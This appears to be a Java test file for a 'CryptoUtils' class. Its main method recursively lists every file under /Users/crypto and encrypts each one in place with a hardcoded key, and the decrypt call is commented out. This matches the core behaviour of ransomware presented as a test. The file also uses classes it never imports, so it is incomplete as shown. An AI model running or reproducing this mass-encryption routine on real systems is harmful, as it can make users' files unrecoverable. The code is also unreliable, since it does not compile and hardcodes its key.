package com.crypto;

import java.io.File;
/**
 * A tester for the CryptoUtils class
 * @author www.codejava.net
 */
public class UtilsTest {
    // public static void main(String[] args) {
    //     String key = "«ÒÙÏ˚>È*123ABCxyz@#$%^&!@#";
    //     //File inputFile = new File("//crypto/Test123.java");

    //     try {
    //         Utils.encrypt(key, inputFile);
    //         //Utils.decrypt(key, inputFile);
    //     } catch (Exception ex) {
    //         System.out.println(ex.getMessage());
    //         ex.printStackTrace();
    //     }
    // }

    public static void main(String[] args) throws IOException
    {
        String key = "«ÒÙÏ˚>È*123ABCxyz@#$%^&!@#";
        Path rootPath = Paths.get("/Users/crypto");

        List<String> allFiles = new ArrayList<>();
        listAllFiles(rootPath, allFiles);

        System.out.println("Found files:");
        allFiles.forEach(System.out::println);

        for (String file: allFiles) {

            File inputFile = new File(file);
            try {
                Utils.encrypt(key, inputFile);
                //Utils.decrypt(key, inputFile);
            } catch (Exception ex) {
                System.out.println(ex.getMessage());
                ex.printStackTrace();
            }

        }

    }

    private static void listAllFiles(Path currentPath, List<String> allFiles)
            throws IOException
    {
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(currentPath))
        {
            for (Path entry : stream) {
                if (Files.isDirectory(entry)) {
                    listAllFiles(entry, allFiles);
                } else {
                    allFiles.add(entry.toAbsolutePath().toString());
                }
            }
        }
    }
}
